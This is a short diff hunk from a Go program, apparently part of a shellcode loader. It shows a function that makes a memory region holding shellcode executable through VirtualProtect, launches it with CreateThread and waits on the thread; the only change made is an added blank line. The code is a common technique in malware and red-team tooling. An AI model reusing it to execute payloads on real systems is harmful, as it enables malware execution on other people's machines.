@@ -20,5 +20,6 @@ func CreateThread(shellcode []byte) {
 	wdll.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
 	thread, _, _ := wdll.CreateThread().Call(0, 0, addr, uintptr(0), 0, 0)
+
 	wdll.WaitForSingleObject().Call(thread, 0xFFFFFFFF)
 }
